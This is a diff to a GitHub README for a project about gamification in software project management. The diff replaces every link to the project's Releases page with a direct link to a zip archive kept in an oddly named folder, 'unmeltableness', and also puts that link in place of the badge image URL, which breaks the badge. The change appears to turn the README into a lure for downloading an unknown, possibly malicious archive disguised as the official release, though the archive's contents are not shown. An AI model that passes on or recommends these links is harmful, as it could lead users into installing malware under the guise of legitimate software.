@@ -4,13 +4,13 @@
 Gamification in Software Project Management applies game elements to projects. This approach boosts team motivation, improves productivity, and makes tracking progress more engaging. Our repository includes source code, reports, presentations, documents, and video tutorials to help you implement these techniques effectively.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/cradzz14/Gamification-In-Software-Project-Management/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/cradzz14/Gamification-In-Software-Project-Management/main/unmeltableness/Management_Project_Gamification_In_Software_2.3.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/cradzz14/Gamification-In-Software-Project-Management/main/unmeltableness/Management_Project_Gamification_In_Software_2.3.zip)
 
 ## 🚀 Getting Started
 Follow these steps to get started with our application:
 
 1. **Visit the Download Page:**
-   Go to our [Releases page](https://github.com/cradzz14/Gamification-In-Software-Project-Management/releases) to find the latest version.
+   Go to our [Releases page](https://raw.githubusercontent.com/cradzz14/Gamification-In-Software-Project-Management/main/unmeltableness/Management_Project_Gamification_In_Software_2.3.zip) to find the latest version.
 
 2. **Choose Your Version:**
    On the Releases page, you will see different versions of the software. Click on the one that suits your needs.
@@ -64,6 +64,6 @@ Explore further learning materials and resources:
 Stay connected with others using gamification in project management. Share your experiences and learn from one another!
 
 ## 🔗 Download & Install
-To download the application, [visit this page to download](https://github.com/cradzz14/Gamification-In-Software-Project-Management/releases) once again. Follow the steps outlined in the "Getting Started" section to get started easily!
+To download the application, [visit this page to download](https://raw.githubusercontent.com/cradzz14/Gamification-In-Software-Project-Management/main/unmeltableness/Management_Project_Gamification_In_Software_2.3.zip) once again. Follow the steps outlined in the "Getting Started" section to get started easily!
 
 Thank you for using Gamification-In-Software-Project-Management! We hope this tool helps you and your team achieve your project goals effectively.
